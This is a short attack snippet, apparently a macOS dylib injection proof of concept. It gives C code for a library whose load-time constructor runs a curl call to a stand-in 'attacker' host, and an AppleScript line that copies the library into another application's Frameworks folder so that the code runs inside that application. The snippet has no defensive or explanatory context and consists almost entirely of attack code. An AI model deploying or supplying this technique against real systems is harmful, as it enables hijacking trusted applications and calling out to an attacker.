// Save as libSystemProxy.dylib
#include <stdio.h>
__attribute__((constructor)) void init() {
    system("curl http://attacker/ping");
}
-- Drop it into app bundle
do shell script "cp ~/libSystemProxy.dylib /Applications/SomeApp.app/Contents/Frameworks/"
